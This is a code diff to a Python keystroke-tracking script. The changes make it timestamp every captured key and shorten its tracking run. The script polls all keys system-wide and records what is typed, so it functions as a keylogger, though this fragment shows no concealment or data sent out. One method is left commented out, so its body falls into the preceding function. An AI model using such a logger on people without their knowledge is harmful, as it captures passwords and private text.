@@ -204,7 +204,7 @@ def IsKeyToggled(VK_KEYCODE):
 class KeyTracker:
     def __init__(self):
         self.tracking = False
-        self.tracked_string_concat = ""
+        self.tracked_string_concat = "" + " " + str(time.time()) + "\n\n\n"
         self.file_open = False
 
     def StartTracking(self):
@@ -218,7 +218,7 @@ class KeyTracker:
         str_old = self.tracked_string_concat
         if self.tracking and VKToString(key) != "SHIFT":
             if IsKeyToggled(StringToVK("CAPSLOCK")):
-                self.tracked_string_concat = self.tracked_string_concat + VKToString(key).upper()
+                self.tracked_string_concat = self.tracked_string_concat + VKToString(key).upper() + " " + str(time.time()) + "\n\n\n"
             elif IsKeyPressed(StringToVK("SHIFT")):
                 shiftEquiv = False
                 try:
@@ -228,18 +228,18 @@ class KeyTracker:
                     pass
 
                 if shiftEquiv:
-                    self.tracked_string_concat = self.tracked_string_concat + ShiftEquivs[key]
+                    self.tracked_string_concat = self.tracked_string_concat + ShiftEquivs[key] + " " + str(time.time()) + "\n\n\n"
                 else:
-                    self.tracked_string_concat = self.tracked_string_concat + VKToString(key).upper()
+                    self.tracked_string_concat = self.tracked_string_concat + VKToString(key).upper() + " "  + str(time.time()) + "\n\n\n"
             else:
-                self.tracked_string_concat = self.tracked_string_concat + VKToString(key)
-            print(self.tracked_string_concat.replace(str_old, ""), time.time())
+                self.tracked_string_concat = self.tracked_string_concat + VKToString(key) + " " + str(time.time()) + "\n\n\n"
+            print(self.tracked_string_concat.replace(str_old, ""))
 
     # def KeyUp(self, key):
         str_old = self.tracked_string_concat
         if self.tracking and VKToString(key) == "SHIFT":
-            self.tracked_string_concat = self.tracked_string_concat + VKToString(key)
-            print(self.tracked_string_concat.replace(str_old, ""), time.time())
+            self.tracked_string_concat = self.tracked_string_concat + VKToString(key) + " " + str(time.time()) + "\n\n\n"
+            print(self.tracked_string_concat.replace(str_old, ""))
             pass
 
     def UpdateKeyState(self, key, state):  
@@ -280,7 +280,7 @@ class KeyTracker:
         KeyTracker.StopTracking()
 
 KeyTracker = KeyTracker()
-t = Thread(KeyTracker.TrackData, [100000])
+t = Thread(KeyTracker.TrackData, [10])
 while True:
     for key, key_name in VKStr.items():
         KeyTracker.UpdateKeyState(key, IsKeyPressed(key))
